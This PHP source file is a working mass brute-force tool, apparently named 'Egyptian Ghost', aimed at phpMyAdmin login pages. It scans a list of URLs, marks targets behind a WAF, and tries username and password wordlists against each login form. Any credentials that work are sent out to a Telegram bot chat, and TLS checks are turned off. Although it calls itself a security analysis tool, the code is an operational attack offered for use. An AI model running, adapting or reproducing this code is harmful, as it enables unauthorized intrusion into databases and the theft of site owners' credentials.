<?php

// Egyptian Ghost v1.0
// A tool for brute force login testing and security analysis
include_once("./settings.php");

// Welcome message
function showBanner()
{
// Change encoding to UTF-8
        shell_exec('chcp 65001 > nul');
// Read text from file
   // $banner = file_get_contents('banner.txt');

    $banner = "
    
███████╗ ██████╗██╗   ██╗██████╗ ████████╗██╗ █████╗ ███╗   ██╗
██╔════╝██╔════╝╚██╗ ██╔╝██╔══██╗╚══██╔══╝██║██╔══██╗████╗  ██║
█████╗  ██║  ███╗╚████╔╝ ██████╔╝   ██║   ██║███████║██╔██╗ ██║
██╔══╝  ██║   ██║ ╚██╔╝  ██╔═══╝    ██║   ██║██╔══██║██║╚██╗██║
███████╗╚██████╔╝  ██║   ██║        ██║   ██║██║  ██║██║ ╚████║
╚══════╝ ╚═════╝   ╚═╝   ╚═╝        ╚═╝   ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗                    
██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝                    
██║  ███╗███████║██║   ██║███████╗   ██║                       
██║   ██║██╔══██║██║   ██║╚════██║   ██║                       
╚██████╔╝██║  ██║╚██████╔╝███████║   ██║                       
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝                       
                                                               
     {v1.0.0}
     https://github.com/egyptian-ghost/phpmyadmin_Bruteforce_php
    ";

// Convert the text to UTF-8 to ensure it displays correctly.
    echo "\033[33m" . mb_convert_encoding($banner, 'UTF-8') . "\033[0m"; // Print text in yellow
}

showBanner();

//Define colors for the interface
function coloredOutput($text, $color) {
    $colors = [
        'red' => "\033[31m",
        'green' => "\033[32m",
        'yellow' => "\033[33m",
        'blue' => "\033[34m",
        'reset' => "\033[0m"
    ];
    return $colors[$color] . $text . $colors['reset'];
}

// Display the tool name
//echo coloredOutput("Egyptian Ghost\n", 'yellow');
echo coloredOutput("===============================\n", 'green');
echo coloredOutput("Developed by Egyptian Ghost Team\n\n", 'blue');



// Send message to Telegram
function sendTelegramMessage($message, $token, $chatId)
{
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}


//Connection test function with addresses
function testUrl($url) {
    echo coloredOutput("Trying to connect to $url\n", 'blue');
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $response = curl_exec($ch);
        $header = curl_getinfo($ch);
        curl_close($ch);

        if (strpos($response, 'phpMyAdmin') !== false) {
            echo coloredOutput("Success\n", 'green');
            return "Success";
        }
        if (isset($header['http_code']) && $header['http_code'] == 403) {
            echo coloredOutput("WAF detected\n", 'red');
            return "WAF";
        }
    } catch (Exception $e) {
        echo coloredOutput("Failed: " . $e->getMessage() . "\n", 'red');
        return "Fail";
    }
    return "Fail";
}

// Token extraction function
function getToken($html) {
    preg_match('/name="token" value="(.*?)"/i', $html, $matches);
    return $matches[1] ? $matches[1] :'';
}

// Login test function
function tryLogin($url, $user, $pwd, $token) {
    $data = [
        'pma_username' => $user,
        'pma_password' => $pwd,
        'server' => 1,
        'token' => $token,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

// brute force function
function bruteForce($url, $userDic, $passDic, $telegramToken, $telegramChatId) {
    echo coloredOutput("Starting brute force on $url\n", 'yellow');
global $successLog;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $html = curl_exec($ch);
    curl_close($ch);

    $token = getToken($html);
    if (!$token) {
        echo coloredOutput("Token not found\n", 'red');
        return;
    }

// Open the usernames file
    $userFile = fopen($userDic, 'r');
    if (!$userFile) {
        echo coloredOutput("Failed to open user file\n", 'red');
        return;
    }

    while (($user = fgets($userFile)) !== false) {
        $user = trim($user);

        // Open the password file for each user
        $passFile = fopen($passDic, 'r');
        if (!$passFile) {
            echo coloredOutput("Failed to open password file\n", 'red');
            fclose($userFile);
            return;
        }

        while (($pwd = fgets($passFile)) !== false) {
            $pwd = trim($pwd);
            echo "Trying $user:$pwd\n";

            $response = tryLogin($url, $user, $pwd, $token);
            if (strpos($response, 'login') === false) {
                echo coloredOutput("Login successful: $user:$pwd\n", 'green');
                $result = "Success: $url | $user | $pwd";
                file_put_contents($successLog, "$url | $user | $pwd\n", FILE_APPEND);
               // Send the result to Telegram
                sendTelegramMessage($result, $telegramToken, $telegramChatId);
                fclose($passFile);
                fclose($userFile);
                return;
            }
        }

        fclose($passFile);
    }

    fclose($userFile);
    echo coloredOutput("Brute force failed for $url\n", 'red');
}

//Reading from files
$urls = file($urlDic, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$urlsSuccess = [];
$urlsFail = [];
$urlsWaf = [];

// Site testing
foreach ($urls as $url) {
    $result = testUrl($url);
    if ($result === "Success") {
        $urlsSuccess[] = $url;
    } elseif ($result === "WAF") {
        $urlsWaf[] = $url;
    } else {
        $urlsFail[] = $url;
    }
}

// Save results
file_put_contents($failLog, implode("\n", $urlsFail) . "\n");
file_put_contents($wafLog, implode("\n", $urlsWaf) . "\n");

// Login experience
foreach ($urlsSuccess as $url) {
    bruteForce($url, $userDic, $passDic, $telegramToken, $telegramChatId);
}

echo coloredOutput("Finished\n", 'green');
?>
